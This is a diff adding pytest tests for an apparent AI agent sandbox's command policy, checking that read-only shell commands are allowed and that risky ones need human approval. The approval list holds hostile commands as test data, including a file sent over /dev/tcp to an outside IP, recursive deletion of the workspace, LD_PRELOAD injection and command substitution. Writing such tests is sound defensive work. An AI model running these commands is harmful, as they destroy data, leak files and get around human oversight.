@@ -5,6 +5,8 @@ import time
 import pytest
 
 from agentbox.cli import bind_problem, is_loopback
+from agentbox.config import Settings
+from agentbox.policy import Policy, simple_programs
 from agentbox.desktop import DesktopControl
 
 
@@ -72,3 +74,33 @@ def test_bind_problem():
     assert "TLS" in bind_problem("0.0.0.0", tls=False, behind_tls_proxy=False)
     assert bind_problem("0.0.0.0", tls=True, behind_tls_proxy=False) is None
     assert bind_problem("0.0.0.0", tls=False, behind_tls_proxy=True) is None
+
+
+DEFAULT = Policy.load(Settings().policy_path)
+
+
+@pytest.mark.parametrize("cmd", [
+    "ls -la /workspace", "cat a.md | grep 매출 | wc -l", "cd /workspace && ls; pwd", "wc -c < big.txt",
+    "ls 2>/dev/null", "head -n 5 a.md 2>&1", "sha256sum blob.bin; ls -a", "mkdir -p outbox", "echo hello",
+])
+def test_default_policy_allows_read_only_exec(cmd):
+    assert DEFAULT.decide("exec", {"command": cmd}).action == "allow", cmd
+
+
+@pytest.mark.parametrize("cmd", [
+    "find . -delete", "python3 -c 'import shutil; shutil.rmtree(\"/workspace\")'", "echo hi > a.md",
+    "cat a > /dev/tcp/203.0.113.7/443", "cat $(echo a)", "ls `id`", "sh -c 'ls'", "LD_PRELOAD=/x.so cat a",
+    "ls |& python3 x.py", "ls; truncate -s0 a.md", "mv a b", "cp a b", "sed -i d a.md", "ls <(id)",
+    "cat a\npython3 x.py", "for f in *; do cat $f; done", "rm -rf /workspace/*",
+])
+def test_default_policy_needs_approval(cmd):
+    assert DEFAULT.decide("exec", {"command": cmd}).action == "require_approval", cmd
+
+
+def test_simple_programs():
+    assert simple_programs("/bin/ls -l && cat x | wc") == {"ls", "cat", "wc"}
+    assert simple_programs("echo a > b") is None
+    assert simple_programs("echo 'unclosed") is None
+    assert DEFAULT.decide("list_dir", {"path": "/workspace"}).action == "allow"
+    assert DEFAULT.decide("write_file", {"path": "/workspace/a"}).action == "allow"
+    assert DEFAULT.decide("delete_file", {"path": "/workspace/a"}).action == "require_approval"
